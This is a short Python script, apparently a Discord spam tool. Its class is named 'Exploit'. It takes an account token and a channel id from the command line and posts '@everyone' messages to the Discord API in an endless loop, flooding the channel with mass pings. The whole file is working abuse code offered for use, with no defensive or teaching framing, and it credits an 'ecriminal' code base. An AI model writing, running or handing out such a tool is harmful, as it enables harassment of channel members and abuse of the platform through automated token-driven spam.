# Author: pythonoob (@iamnxtarxbxt)
import requests
import sys
class Exploit:
    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}
    def execute(self):
        return requests.post(f'https://discordapp.com/api/v8/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '@everyone'})
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()
    token = sys.argv[1]
    channel_id = sys.argv[2]
    exploit = Exploit(token, channel_id)
    while True:
        exploit.execute()
if __name__ == '__main__':
    main()
    
# Thank ecriminal "https://github.com/ecriminal" for code base
